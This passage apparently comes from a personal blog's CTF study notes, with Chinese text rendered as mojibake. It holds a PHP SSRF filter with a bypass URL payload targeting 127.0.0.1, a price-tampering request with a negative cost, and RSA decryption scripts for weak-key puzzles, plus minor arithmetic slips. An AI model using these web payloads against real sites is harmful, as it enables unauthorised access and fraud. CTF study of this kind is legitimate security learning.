</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://a:@127.0.0.1:80@baidu.com/flag.php</span><br></pre></td></tr></table></figure>

<p>[buuctf åˆ·é¢˜è®°å½• <a href="https://www.cnblogs.com/murkuo/p/14905886.html">ç¬¬äºŒç«  webè¿›é˜¶]SSRF Training - MuRKuo - åšå®¢å›­ (cnblogs.com)</a></p>
<h2 id="ç¬¬äºŒç« -webè¿›é˜¶-XSSé—¯å…³"><a href="#ç¬¬äºŒç« -webè¿›é˜¶-XSSé—¯å…³" class="headerlink" title="[ç¬¬äºŒç«  webè¿›é˜¶]XSSé—¯å…³"></a>[ç¬¬äºŒç«  webè¿›é˜¶]XSSé—¯å…³</h2><p>è§£æ³•ä¸€ï¼š</p>
<p>ç›´æ¥åœ¨urlæ é‡Œè¾“å…¥level7,ç›´æ¥çœ‹åˆ°flag</p>
<p>è§£æ³•äºŒï¼š</p>
<p>[(9æ¡æ¶ˆæ¯) BuuCTF[ç¬¬äºŒç«  webè¿›é˜¶]XSSé—¯å…³_å±±å·ç»¿æ°´çš„åšå®¢-CSDNåšå®¢](<a href="https://blog.csdn.net/m_de_g/article/details/119085955#:~:text=BuuCTF">https://blog.csdn.net/m_de_g/article/details/119085955#:~:text=BuuCTF</a> [ç¬¬äºŒç«  webè¿›é˜¶]XSSé—¯å…³ 1 1.ç¬¬ä¸€å…³ï¼Œæ— ä»»ä½•è¿‡æ»¤ 2 2.ç¬¬äºŒå…³ï¼Œç®€å•é—­åˆç»•è¿‡ 3,6 6.ç¬¬å…­å…³ï¼Œxssæ¨¡æ¿æ³¨å…¥ (æ²™ç®±é€ƒé€¸) 7 1.å®šä¹‰ 8 2.åŸç† æ›´å¤šé¡¹ç›®)</p>
<p>ç¬¬ä¸€å…³ï¼š</p>
<h2 id="ç¬¬ä¸‰ç« -webè¿›é˜¶-é€»è¾‘æ¼æ´"><a href="#ç¬¬ä¸‰ç« -webè¿›é˜¶-é€»è¾‘æ¼æ´" class="headerlink" title="[ç¬¬ä¸‰ç«  webè¿›é˜¶]é€»è¾‘æ¼æ´"></a>[ç¬¬ä¸‰ç«  webè¿›é˜¶]é€»è¾‘æ¼æ´</h2><p>æŠ“åŒ…ä¿®æ”¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /buy.php?cost=-2000&amp;goods=2 HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç¤ºè´­ä¹°æˆåŠŸï¼Œ</p>
<p>ç„¶åå†ä¿®æ”¹å›æ¥ï¼Œå³å¯çœ‹åˆ°flag</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>rsa</title>
    <url>/2023/03/06/rsa/</url>
    <content><![CDATA[<p> rsa<br> <span id="more"></span></p>
<h2 id="RSAåŠ å¯†"><a href="#RSAåŠ å¯†" class="headerlink" title="RSAåŠ å¯†"></a>RSAåŠ å¯†</h2><p>æ¬§æ‹‰å®šç†</p>
<p>è‹¥nä¸ºç´ æ•°æ¬§æ‹‰(n)&#x3D;n-1;</p>
<p>eä¸æ¬§æ‹‰(n)äº’è´¨    å…¬é’¥e,n ç§é’¥d,n</p>
<p>Mä¸ºæ˜æ–‡ï¼ŒCä¸ºå¯†æ–‡ï¼›</p>
<p>M^e mod n&#x3D;C</p>
<p>C^d mod n &#x3D;M</p>
<p>ed&#x3D;1(modæ¬§æ‹‰(n))</p>
<p>dä¸ºæ¨¡åå…ƒç´ è®¡ç®—å…¬å¼ï¼Œd&#x3D;gmpy2.invert(e,(p-1)*(q-1))</p>
<p><code>n=p*q  ï¼Œæ¬§æ‹‰n=(p-1)*(q-1)</code></p>
<p>å·²çŸ¥dpï¼Œdqï¼Œpï¼Œqï¼Œc</p>
<blockquote>
<p>dp&#x3D;d%(p-1)</p>
<p>dq&#x3D;d%(q-1)</p>
</blockquote>
<p><a href="https://blog.csdn.net/huanghelouzi/article/details/82943615?ops_request_misc=&request_id=&biz_id=102&utm_term=ctf%20rsa&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-8-82943615.142%5Ev70%5Eone_line,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">rsaè§£å¯†è¯¦è§£ä»¥åŠè„šæœ¬</a>.<br><a href="https://blog.csdn.net/vhkjhwbs/article/details/101160822?ops_request_misc=&request_id=&biz_id=102&utm_term=ctf%20rsa&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-9-101160822.142%5Ev70%5Eone_line,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">rsaè§£å¯†è¯¦è§£ä»¥åŠè„šæœ¬</a>;</p>
<h2 id="gmpy2å¸¸è§å‡½æ•°ä½¿ç”¨"><a href="#gmpy2å¸¸è§å‡½æ•°ä½¿ç”¨" class="headerlink" title="gmpy2å¸¸è§å‡½æ•°ä½¿ç”¨"></a>gmpy2å¸¸è§å‡½æ•°ä½¿ç”¨</h2><p><strong>1.åˆå§‹åŒ–å¤§æ•´æ•°</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.mpz(909090)</span><br><span class="line">result:mpz(909090)</span><br></pre></td></tr></table></figure>

<p><strong>2.æ±‚å¤§æ•´æ•°a,bçš„æœ€å¤§å…¬å› æ•°</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.gcd(6,18)</span><br><span class="line">result:mpz(6)</span><br></pre></td></tr></table></figure>

<p><strong>3.æ±‚å¤§æ•´æ•°xæ¨¡mçš„é€†å…ƒy</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">#4*6 â‰¡ 1 mod 23</span><br><span class="line">gmpy2.invert(4,23)</span><br><span class="line">result:mpz(6)</span><br></pre></td></tr></table></figure>

<p><strong>4.æ£€éªŒå¤§æ•´æ•°æ˜¯å¦ä¸ºå¶æ•°</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_even(6)</span><br><span class="line">result:True</span><br><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_even(7)</span><br><span class="line">result:False</span><br></pre></td></tr></table></figure>

<p><strong>5.æ£€éªŒå¤§æ•´æ•°æ˜¯å¦ä¸ºå¥‡æ•°</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_odd(6)</span><br><span class="line">result:False</span><br><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_odd(7)</span><br><span class="line">result:True</span><br></pre></td></tr></table></figure>

<p><strong>6.æ£€éªŒå¤§æ•´æ•°æ˜¯å¦ä¸ºç´ æ•°</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.is_prime(5)</span><br><span class="line">result:True</span><br></pre></td></tr></table></figure>

<p><strong>7.æ±‚å¤§æ•´æ•°xå¼€næ¬¡æ ¹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">gmpy2.iroot(81,2)</span><br><span class="line">result:(mpz(9),True)</span><br></pre></td></tr></table></figure>

<p><strong>8.æ±‚å¤§æ•´æ•°xçš„yæ¬¡å¹‚æ¨¡må–ä½™</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">#2^4 mod 5 </span><br><span class="line">gmpy2.powmod(2,4,15)</span><br><span class="line">result:mpz(1)</span><br></pre></td></tr></table></figure>

<p>libnumåº“<br>åè¿›åˆ¶è½¬å­—ç¬¦ä¸² libnum.n2s(j)</p>
<h2 id="å·²çŸ¥p-q-eï¼Œæ±‚dã€‚"><a href="#å·²çŸ¥p-q-eï¼Œæ±‚dã€‚" class="headerlink" title="å·²çŸ¥p, q, eï¼Œæ±‚dã€‚"></a>å·²çŸ¥p, q, eï¼Œæ±‚dã€‚</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 447685307</span><br><span class="line">q = 2037</span><br><span class="line">e = 17</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>

<h2 id="å·²çŸ¥-p-q-e-c-ï¼Œæ±‚mã€‚"><a href="#å·²çŸ¥-p-q-e-c-ï¼Œæ±‚mã€‚" class="headerlink" title="å·²çŸ¥(p, q, e,c)ï¼Œæ±‚mã€‚"></a>å·²çŸ¥(p, q, e,c)ï¼Œæ±‚mã€‚</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p=447685307</span><br><span class="line">q=2037</span><br><span class="line">e=17</span><br><span class="line">c=704796792</span><br><span class="line"></span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c,d,p*q)</span><br><span class="line"></span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<h2 id="å·²çŸ¥p-q-dp-dq-c-æ±‚m"><a href="#å·²çŸ¥p-q-dp-dq-c-æ±‚m" class="headerlink" title="å·²çŸ¥p,q,dp,dq,c,æ±‚m"></a>å·²çŸ¥p,q,dp,dq,c,æ±‚m</h2><p>buu RSA1</p>
<p>æ‰€éœ€è¦æ±‚çš„å€¼ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure>

<p>(1)è®¡ç®—qé€†æ¨¡q1;<br>(2)è®¡ç®—m1ä¸ºcçš„dpæ¬¡æ–¹å†å¯¹pæ±‚æ¨¡<br>(3)è®¡ç®—m2ä¸ºcçš„dqæ¬¡æ–¹å†å¯¹qæ±‚æ¨¡<br>(4)m &#x3D; ((((m2 - m1) * p1) % q) * p + m2) % n;</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">dp = </span><br><span class="line">dq = </span><br><span class="line">c = </span><br><span class="line">n = p * q</span><br><span class="line">m1 = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c, dq, q)</span><br><span class="line">p1 = gmpy2.invert(q, p)</span><br><span class="line">m = ((((m2 - m1) * p1) % q) * p + m2) % n</span><br><span class="line"><span class="built_in">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/MikeCoke/article/details/105967809">(4æ¡æ¶ˆæ¯) BUUCTF RSAé¢˜ç›®å…¨è§£1_buuctf rsa1_å®å˜‰çš„åšå®¢-CSDNåšå®¢</a></p>
<h2 id="å·²çŸ¥-e-dp-n-c-ï¼Œæ±‚m"><a href="#å·²çŸ¥-e-dp-n-c-ï¼Œæ±‚m" class="headerlink" title="å·²çŸ¥(e,dp, n, c)ï¼Œæ±‚m"></a>å·²çŸ¥(e,dp, n, c)ï¼Œæ±‚m</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">e = 65537</span><br><span class="line">n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br><span class="line">dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br><span class="line"></span><br><span class="line">c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br><span class="line"></span><br><span class="line">for i in range(1,e):</span><br><span class="line">    if (e*dp-1)%i == 0 and n%((e*dp-1)//i+1)==0:</span><br><span class="line">        q = n//((e*dp-1)//i+1)</span><br><span class="line">        phi = (q-1)*((e*dp-1)//i)</span><br><span class="line">        d = gmpy2.invert(e,phi)</span><br><span class="line">        m = gmpy2.powmod(c,d,n)</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br><span class="line">n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br><span class="line">e1=11187289</span><br><span class="line">c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br><span class="line">e2=9647291</span><br></pre></td></tr></table></figure>

<h2 id="å·²çŸ¥-n-e1-e2-c1-c2-ï¼Œæ±‚mã€‚"><a href="#å·²çŸ¥-n-e1-e2-c1-c2-ï¼Œæ±‚mã€‚" class="headerlink" title="å·²çŸ¥(n, e1, e2,c1,c2)ï¼Œæ±‚mã€‚"></a>å·²çŸ¥(n, e1, e2,c1,c2)ï¼Œæ±‚mã€‚</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">e1 = 11187289</span><br><span class="line">e2 = 9647291</span><br><span class="line"></span><br><span class="line">s = gmpy2.gcdext(e1,e2)</span><br><span class="line">a = s[1]</span><br><span class="line">b = s[2]</span><br><span class="line"></span><br><span class="line">if a&lt;0:</span><br><span class="line">    a = -a</span><br><span class="line">    c1 = gmpy2.invert(c1,n)</span><br><span class="line">else:</span><br><span class="line">    b = -b</span><br><span class="line">    c2 = gmpy2.invert(c2,n)</span><br><span class="line"></span><br><span class="line">m = (gmpy2.powmod(c1,a,n)*gmpy2.powmod(c2,b,n))%n</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>

<h2 id="å·²çŸ¥-e-n1-c1-n2-c2-ï¼Œæ±‚mã€‚"><a href="#å·²çŸ¥-e-n1-c1-n2-c2-ï¼Œæ±‚mã€‚" class="headerlink" title="å·²çŸ¥( e,n1,c1,n2,c2)ï¼Œæ±‚mã€‚"></a>å·²çŸ¥( e,n1,c1,n2,c2)ï¼Œæ±‚mã€‚</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">n1 = </span><br><span class="line">c1 = </span><br><span class="line"></span><br><span class="line">n2 = </span><br><span class="line">c2 = </span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n1,n2)</span><br><span class="line">q = n1 // p</span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c1,d,n1)</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>

<h2 id="å·²çŸ¥-p-q-p-q-e-c-ï¼Œæ±‚mã€‚"><a href="#å·²çŸ¥-p-q-p-q-e-c-ï¼Œæ±‚mã€‚" class="headerlink" title="å·²çŸ¥(p+q,p-q, e,c)ï¼Œæ±‚mã€‚"></a>å·²çŸ¥(p+q,p-q, e,c)ï¼Œæ±‚mã€‚</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">e=16300321</span><br><span class="line"></span><br><span class="line">a=</span><br><span class="line"></span><br><span class="line">b=</span><br><span class="line"></span><br><span class="line">c=</span><br><span class="line"></span><br><span class="line">p = (a+b)//2</span><br><span class="line">q = (a-b)//2</span><br><span class="line"></span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"></span><br><span class="line">m = gmpy2.powmod(c,d,p*q)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>

<h2 id="å·²çŸ¥-e-n-c-ï¼Œæ±‚mã€‚"><a href="#å·²çŸ¥-e-n-c-ï¼Œæ±‚mã€‚" class="headerlink" title="å·²çŸ¥(e,n,c)ï¼Œæ±‚mã€‚"></a>å·²çŸ¥(e,n,c)ï¼Œæ±‚mã€‚</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">n = 1455925529734358105461406532259911790807347616464991065301847</span><br><span class="line">c = 69380371057914246192606760686152233225659503366319332065009</span><br><span class="line">p = 1201147059438530786835365194567</span><br><span class="line">q = 1212112637077862917192191913841</span><br><span class="line"></span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>

<h2 id="å·²çŸ¥-e-n-c-ï¼Œæ±‚mã€‚-1"><a href="#å·²çŸ¥-e-n-c-ï¼Œæ±‚mã€‚-1" class="headerlink" title="å·²çŸ¥(e,n,c)ï¼Œæ±‚mã€‚"></a>å·²çŸ¥(e,n,c)ï¼Œæ±‚mã€‚</h2><p>eæ¯”è¾ƒå°æ—¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">e = 3</span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    if gmpy2.iroot((c+i*n),3)[1] == True:</span><br><span class="line">        m = gmpy2.iroot((c+i*n),3)[0]</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å…¬çº¦æ•°"><a href="#å…¬çº¦æ•°" class="headerlink" title="å…¬çº¦æ•°"></a>å…¬çº¦æ•°</h2><p>é¢˜ç›®å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">m=bytes_to_long(b&#x27;xxxxxx&#x27;)</span><br><span class="line">e=65537</span><br><span class="line">p=getPrime(1024)</span><br><span class="line">q1=getPrime(1024)</span><br><span class="line">q2=getPrime(1024)</span><br><span class="line">n1=p*q1</span><br><span class="line">n2=p*q2</span><br><span class="line">c1=pow(m,e,n1)</span><br><span class="line">c2=pow(m,e,n2)</span><br><span class="line">n3=n1^n2</span><br><span class="line">print(&#x27;n1=&#x27;,n1)</span><br><span class="line">print(&#x27;n3=&#x27;,n3)</span><br><span class="line">print(&#x27;c1=&#x27;,c1)</span><br><span class="line">print(&#x27;c2=&#x27;,c2)</span><br><span class="line">#n1= 9852079772293301283705208653824307027320071498525390578148444258198605733768947108049676831872672654449631852459503049139275329796717506126689710613873813880735666507857022786447784753088176997374711523987152412069255685005264853118880922539048290400078105858759506186417678959028622484823376958194324034590514104266608644398160457382895380141070373685334979803658172378382884352616985632157233900719194944197689860219335238499593658894630966428723660931647038577670614850305719449893199713589368780231046895222526070730152875112477675102652862254926169713030701937231206405968412044029177246460558028793385980934233</span><br><span class="line">#n3= 4940268030889181135441311597961813780480775970170156650560367030148383674257975796516865571557828263935532335958510269356443566533284856608454193676600884849913964971291145182724888816164723930966472329604608512023988191536173112847915884014445539739070437180314205284883149421228744714989392788108329929896637182055266508625177260492776962915873036873839946591259443753924970795669864031580632650140641456386202636466624658715315856453572441182758855085077441336516178544978457053552156714181607801760605521338788424464551796638531143900048375037218585999440622490119344971822707261432953755569507740550277088437182</span><br><span class="line">#c1= 7066425618980522033304943700150361912772559890076173881522840300333719222157667104461410726444725540513601550570478331917063911791020088865705346188662290524599499769112250751103647749860198318955619903728724860941709527724500004142950768744200491448875522031555564384426372047270359602780292587644737898593450148108629904854675417943165292922990980758572264063039172969633878015560735737699147707712154627358077477591293746136250207139049702201052305840453700782016480965369600667516646007546442708862429431724013679189842300429421340122052682391471347471758814138218632022564279296594279507382548264409296929401260</span><br><span class="line">#c2= 854668035897095127498890630660344701894030345838998465420605524714323454298819946231147930930739944351187708040037822108105697983018529921300277486094149269105712677374751164879455815185393395371001495146490416978221501351569800028842842393448555836910486037183218754013655794027528039329299851644787006463456162952383099752894635657833907958930587328480492546831654755627949756658554724024525108575961076341962292900510328611128404001877137799465932130220386963518903892403159969133882215092783063943679288192557384595152566356483424061922742307738886179947575613661171671781544283180451958232826666741028590085269</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">n1= 9852079772293301283705208653824307027320071498525390578148444258198605733768947108049676831872672654449631852459503049139275329796717506126689710613873813880735666507857022786447784753088176997374711523987152412069255685005264853118880922539048290400078105858759506186417678959028622484823376958194324034590514104266608644398160457382895380141070373685334979803658172378382884352616985632157233900719194944197689860219335238499593658894630966428723660931647038577670614850305719449893199713589368780231046895222526070730152875112477675102652862254926169713030701937231206405968412044029177246460558028793385980934233</span><br><span class="line">n3= 4940268030889181135441311597961813780480775970170156650560367030148383674257975796516865571557828263935532335958510269356443566533284856608454193676600884849913964971291145182724888816164723930966472329604608512023988191536173112847915884014445539739070437180314205284883149421228744714989392788108329929896637182055266508625177260492776962915873036873839946591259443753924970795669864031580632650140641456386202636466624658715315856453572441182758855085077441336516178544978457053552156714181607801760605521338788424464551796638531143900048375037218585999440622490119344971822707261432953755569507740550277088437182</span><br><span class="line">c1= 7066425618980522033304943700150361912772559890076173881522840300333719222157667104461410726444725540513601550570478331917063911791020088865705346188662290524599499769112250751103647749860198318955619903728724860941709527724500004142950768744200491448875522031555564384426372047270359602780292587644737898593450148108629904854675417943165292922990980758572264063039172969633878015560735737699147707712154627358077477591293746136250207139049702201052305840453700782016480965369600667516646007546442708862429431724013679189842300429421340122052682391471347471758814138218632022564279296594279507382548264409296929401260</span><br><span class="line">c2= 854668035897095127498890630660344701894030345838998465420605524714323454298819946231147930930739944351187708040037822108105697983018529921300277486094149269105712677374751164879455815185393395371001495146490416978221501351569800028842842393448555836910486037183218754013655794027528039329299851644787006463456162952383099752894635657833907958930587328480492546831654755627949756658554724024525108575961076341962292900510328611128404001877137799465932130220386963518903892403159969133882215092783063943679288192557384595152566356483424061922742307738886179947575613661171671781544283180451958232826666741028590085269</span><br><span class="line">e=65537</span><br><span class="line"></span><br><span class="line">n2=n1^n3</span><br><span class="line">p=gmpy2.gcd(n1,n2)</span><br><span class="line">q1=n1//p</span><br><span class="line">q2=n2//p</span><br><span class="line">phi1=(p-1)*(q1-1)</span><br><span class="line">d=gmpy2.invert(e,phi1)</span><br><span class="line">m=gmpy2.powmod(c1,d,n1)</span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>



<h2 id="å…¬é’¥åŠ ç­¾"><a href="#å…¬é’¥åŠ ç­¾" class="headerlink" title="å…¬é’¥åŠ ç­¾"></a>å…¬é’¥åŠ ç­¾</h2><p>flag.encå’Œpub.pemä¸¤ä¸ªæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in pub.pem</span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆn,e ;</p>
<p>16è¿›åˆ¶è½¬10è¿›åˆ¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s=&#x27;&#x27;</span><br><span class="line">int(s,16)</span><br></pre></td></tr></table></figure>

<p>yafuåˆ†è§£factor()</p>
